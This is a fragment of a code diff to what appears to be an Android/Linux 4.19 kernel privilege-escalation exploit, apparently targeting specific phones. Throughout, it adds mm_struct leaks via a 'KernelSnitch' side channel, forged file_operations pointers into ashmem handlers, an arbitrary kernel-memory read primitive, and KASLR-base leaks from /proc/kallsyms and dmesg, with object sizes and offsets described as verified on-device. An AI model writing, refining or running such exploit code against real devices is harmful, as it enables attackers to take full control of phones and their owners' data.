@@ -46,13 +46,14 @@
  #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
 --- a/util.c
 +++ b/util.c
-@@ -32,8 +32,33 @@
+@@ -32,8 +32,34 @@
    return kernelsnitch_found_collisions(ks);
  }
  
-+/* candidate SLUB object sizes for the mm_struct cache (ALIGN to cacheline) */
++/* candidate SLUB object sizes for the mm_struct cache (ALIGN to cacheline).
++ * 0x340 was verified on-device (K40/SD870-class 4.19). */
 +static const size_t ksnitch_mm_sizes[] = {
-+  0x380, 0x358, 0x400, 0x360, 0x300, 0x3c0, 0x340, 0x480,
++  0x340, 0x380, 0x358, 0x400, 0x360, 0x300, 0x3c0, 0x480,
 +};
  void run_kernelsnitch_bruteforce(void) {
    kernelsnitch_bruteforce(ks);
@@ -80,7 +81,7 @@
  }
  
  uintptr_t current_kernelsnitch_mm_struct(void) {
-@@ -286,10 +311,19 @@
+@@ -286,10 +312,19 @@
    put64(p, off + FOPS_OWNER_OFF, 0);
    put64(p, off + FOPS_LLSEEK_OFF,
          fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
@@ -100,7 +101,7 @@
    put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
    put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
    put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
-@@ -598,7 +632,7 @@
+@@ -598,7 +633,7 @@
      return 0;
    }
  
@@ -109,7 +110,7 @@
    uintptr_t leaked = ks->mm_struct;
    if (leaked == (uintptr_t)-1) {
      pr_warning("KernelSnitch mm_struct leak failed\n");
-@@ -730,6 +764,24 @@
+@@ -730,6 +765,24 @@
  ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
    unsigned char blob[128];
    memset(blob, 0, sizeof(blob));
@@ -134,7 +135,7 @@
    off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
    uintptr_t page = target - (uintptr_t)pos;
    put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
-@@ -745,6 +797,7 @@
+@@ -745,6 +798,7 @@
    errno = 0;
    ssize_t rd = pread(fd, data, len, pos);
    return rd;
@@ -142,7 +143,7 @@
  }
  
  int is_kernel_ptr(uintptr_t value) {
-@@ -771,3 +824,67 @@
+@@ -771,3 +825,67 @@
  ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
    return configfs_read_once(fd, target, data, len);
  }
@@ -303,15 +304,79 @@
      uintptr_t head = direct_to_head_page(fd, page);
 --- a/slide.c
 +++ b/slide.c
-@@ -403,6 +403,12 @@
+@@ -402,7 +402,76 @@
+   return slide_read_stext();
  }
  
++/* round-3: direct KASLR leak via /proc/kallsyms (safe; works when addresses
++ * are not restricted - common on OPPO/ColorOS debug builds) */
++static int slide_leak_from_kallsyms(void) {
++  FILE *f = fopen("/proc/kallsyms", "r");
++  if (!f) {
++    return 0;
++  }
++  char line[256];
++  uint64_t text = 0;
++  while (fgets(line, sizeof(line), f)) {
++    unsigned long long addr = 0;
++    char type = 0;
++    char name[128] = {0};
++    if (sscanf(line, "%llx %c %127s", &addr, &type, name) == 3 &&
++        strcmp(name, "_text") == 0) {
++      text = (uint64_t)addr;
++      break;
++    }
++  }
++  fclose(f);
++  if (text >= 0xffffff8000000000ULL && (text & 0xffff) == 0) {
++    kaslr_base = text;
++    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
++    kaslr_done = 1;
++    pr_success("slide-kallsyms-ok pid=%d base=%016llx slide=%016llx\n",
++               getpid(), (unsigned long long)kaslr_base,
++               (unsigned long long)kaslr_slide);
++    return 1;
++  }
++  pr_warning("slide: /proc/kallsyms restricted or _text unusable\n");
++  return 0;
++}
++
++/* round-3: dmesg "Kernel Offset" fallback */
++static int slide_leak_from_dmesg(void) {
++  FILE *f = popen("dmesg 2>/dev/null | grep 'Kernel Offset'", "r");
++  if (!f) {
++    return 0;
++  }
++  char line[256];
++  int got = 0;
++  unsigned long long off = 0;
++  while (fgets(line, sizeof(line), f)) {
++    if (sscanf(line, "%*[^:]Kernel Offset: 0x%llx", &off) == 1) {
++      got = 1;
++      break;
++    }
++  }
++  pclose(f);
++  if (!got) {
++    pr_warning("slide: dmesg Kernel Offset unavailable\n");
++    return 0;
++  }
++  kaslr_base = KIMAGE_TEXT_BASE + off;
++  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
++  kaslr_done = 1;
++  pr_success("slide-dmesg-ok pid=%d off=%016llx base=%016llx\n",
++             getpid(), off, (unsigned long long)kaslr_base);
++  return 1;
++}
++
  int slide_leak_kernel_base(void) {
++  if (slide_leak_from_kallsyms() || slide_leak_from_dmesg()) {
++    return 1;
++  }
 +#ifdef CFGOPS_4_19_STYLE
-+  pr_warning("slide: 4.19 gadget values UNVERIFIED "
-+             "(SLIDE_LOGGERS_0_1=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
-+             (unsigned long long)SLIDE_LOGGERS_0_1,
-+             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA);
++  pr_warning("slide: no KASLR leak available; bootid rb-gadget disabled on "
++             "4.19 (placeholder values would panic)\n");
++  return 0;
 +#endif
    for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
@@ -449,9 +514,12 @@
 +#define KMALLOC_CACHE_TYPES 3      /* 4.19 NR_KMALLOC_TYPES */
 +#define ASHMEM_NAME_PREFIX_LEN 0   /* this kernel's ashmem has NO "/dev/ashmem" prefix (binary-verified) */
 +#define ASHMEM_PREFIX_COUNT 0      /* 6.x prefix arithmetic disabled on 4.19 */
-+/* sizeof(mm_struct)=0x358; SLAB_HWCACHE_ALIGN rounds to 64 -> real object 0x380.
-+ * util.c retries a few sizes at runtime, so this is a starting guess only. */
-+#define MM_STRUCT_SZ 0x380
++/* on-device verified: mm_cachep object size == 0x340 (found via retry). */
++#define MM_STRUCT_SZ 0x340
++
++/* KASLR leak: direct /proc/kallsyms + dmesg are tried first (CFGOPS_4_19_STYLE
++ * disables the boot_id rb-gadget, which needs per-build values and would panic
++ * with the placeholder SLIDE_LOGGERS_0_1 / SLIDE_RANDOM_BOOT_ID_DATA). */
 +
 +/* ---------------- symbol offsets (off = sym - KIMAGE_TEXT_BASE) ---------------- */
 +#define ASHMEM_MISC_FOPS_OFF 0x02ed2c60ULL              /* [A] ashmem_misc + 0x10 = miscdevice.fops slot */
